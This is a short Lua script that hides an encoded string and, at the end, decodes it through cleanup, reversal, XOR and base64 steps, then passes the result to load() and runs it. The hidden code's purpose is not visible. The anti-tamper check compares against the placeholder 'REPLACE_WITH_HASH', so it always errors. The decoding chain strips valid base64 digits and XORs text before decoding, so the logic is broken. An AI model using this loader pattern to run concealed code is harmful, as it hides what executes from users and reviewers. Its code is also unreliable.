
-- Highly Obfuscated script
local encodedScript = "w43DpMOaw67Cj8O2w43CjsO0w77CjMOcw5fCjMOzw6XCjMOcw7rCjsKEw5TDp8Ofw43CjMO7w6rDpcOfw4vCj8O4w5DCjsOZw4rCj8Owwo7DpMOcw7vCjMKEw5TDp8OYwovDpMOrw7rDp8Onw43Dp8OFwo/CjMOew5HDp8ORwo7Cj8Oxw4nCjMKEwo/DpMOkw4jCjsOsw5PDp8Ofw5HCjsOvw5PCjsOfw4vDpcOzw5DDpMOew5HCjMOzw6XCj8OZw5TDpcOrw7XDpMOcwo3CjsORwo/Cj8Onw4jCjMOew6XDpMOkw4TDp8KEw4TCj8OxwovCjsOww7XCjMOewo3DpcOvw7XCj8Ocw5TCjsOaw77DpcOZw5HCjMOZw7jDpMOewo3CjsOvw7XDpMOuwovDp8Oow6rCjsOfw5XDp8OZw7rDpMO2w5PCj8KIw6rDp8Ocw4TCjMOvwo7DpcOew5bDp8O7wo/Cj8Ofw47CjsONw5rCj8O+w5TCjsO0w6vCj8Opw7PDpMOVw6vDpcOvw5TDpcOZw6XCj8Orw7TCjMOJw7rDpcOyw7DCjsOVw5bDp8Orw7fCjMOFwo/Cj8Ouw7rDpMOnw7jDpMOww5PCjsORw6vCjsOYw5HDpMO/wo7CjsOvw67DpcOzw7jCj8Oow4TCj8Ozw6nCjMOcw5DCjMOvw7rCj8Ocw67DpMO7w7vDpMOvw4vDpMO/wozDp8Okw6rDpcOrwo7DpMOkwonCjMO4w6rDpMOkw4nCjsOww5bDpcOnw4TCjMOZw4fCj8Orw4XDpcOzw5PDpcOkw63CjsOZwo7CjMOsw7nDp8O7w7vCj8Ocw7XCjMOnw6nDpcOow5XDpMO/w5fCjMOnw4vDpcOsw4fDp8Ozw4XCjMOWw6nDp8Owwo/DpcOow6nDp8OwwonDpMO0w5fCj8OzwozCjsO0w6nDp8Ozw4TCjMOww7nDpcOzw4fDpMO4w4fCjMOxw4fDpMOJwo/DpcOfw4vCj8OVw5DCjMOkw5HDpMOZwo7CjsOxw43Dp8O/w6XDpMOkw4vCjMKNwo/Cj8Ofw5fDpcKIw77Cj8Onw4TDpcKEwo/Cj8Okw4fCj8ORw7rCjsOnw4vCj8KFw5TDpMOyw4fDpMO/w7XCjMOZwo3CjMOVw5DCjsO0w5rCjsKNw7nDp8O0w4/Dp8KEwo/DpMOfw5LCj8O3w6rCjMOnw6XDpMONw5rCjMO0w4XCjMO4w6nCjsOwwozDp8O4w7nDpcOYw4vCjMORw7rDp8OfwozCj8ORwo/CjsOvw5TCj8O8w67Dp8Otw5rDpcOow6rCj8Ofw5XDp8KIw5DCjsOew5HDpcOzw6XDpcOr"
local xorKey = 189

-- Anti-tamper check
local function integrityCheck()
    local originalHash = "REPLACE_WITH_HASH"
    local function hash(str)
        local sum = 0
        for i = 1, #str do
            sum = sum + string.byte(str, i)
        end
        return tostring(sum % 100000)
    end
    if hash(encodedScript) ~= originalHash then
        error("Script integrity check failed!")
    end
end

integrityCheck()

-- Execution environment check
if not _ENV then error("Execution environment compromised!") end

-- Cleanup function to remove junk characters
local function clean(str)
    return str:gsub("[XYZ123]", "")
end

-- Reverse function
local function reverse(str)
    return str:reverse()
end

-- XOR Decryption function
local function xorDecrypt(str, key)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) ~ key)
    end
    return decoded
end

-- Base64 Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the obfuscated script
local scriptFunc = load(decode(xorDecrypt(reverse(clean(encodedScript)), xorKey)))
if scriptFunc then scriptFunc() end
